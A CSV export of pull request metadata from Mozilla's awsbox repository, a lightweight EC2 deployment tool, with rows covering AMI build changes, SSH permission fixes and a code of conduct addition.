,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
0,https://api.github.com/repos/mozilla/awsbox/pulls/149,149,Add Mozilla Code of Conduct,"Fixes #148

_(Message COC002)_",Mozilla-GitHub-Standards,48073334,2019-03-28T03:54:26Z,CONTRIBUTOR,True,15,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,fb2cc0f221b5dacf036754f8fae017a6f44c8f1e,"Add Mozilla Code of Conduct file

Fixes #148.

_(Message COC002)_"
1,https://api.github.com/repos/mozilla/awsbox/pulls/147,147,use standalone ./lib/relative-date.js,"r? - @rfk 
",jrgm,758162,2016-03-23T22:25:04Z,CONTRIBUTOR,True,52,2,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,43b825d8d4a9e36f608c83adf3e1d624e6a0ef37,use standalone ./util/relative-date.js
2,https://api.github.com/repos/mozilla/awsbox/pulls/143,143,"Updating nice-route53, fixes error when no hosted zones are found",,itayadler,512336,2015-02-16T17:46:43Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2d82cb34b937dad90cc270d57fb3d2fa6cb4b704,"Updating nice-route53, fixes error when no hosted zones are found"
3,https://api.github.com/repos/mozilla/awsbox/pulls/139,139,Extra refined instructions for AMI creation,,chilts,3048,2014-06-20T04:12:19Z,CONTRIBUTOR,True,44,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b277bc0d5bf5f489535308f9bcb8782bfabc47b4,Extra refined instructions for AMI creation
4,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,db642163312ed2f5aba40245ba0c2c7175dfb9bd,some small tweaks to docs on make_an_image
5,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,30f8f0475eaab17caf81ec9e12fdd5e1515165f7,need to make StrictModes modifiable by uncommentingd
6,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,bafa69d845fab677b1e8b3d9aa2ab83638ea19a4,"add emacs-nox, strace, locate"
7,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,49dc965d14b6d144645b279f6cd25abecc28cdda,"increase maxBuffer for yum install,update which can spew on a stale ami image"
8,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1d80315db9363179ba8d26ff8a78e2ef72707000,a couple of fixes needed in some cases
9,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3484af09b2b2099342e5f358456a26b5bbd3ae9e,workaround a problem with permissions on ~ec2-user/.ssh/authorized_keys
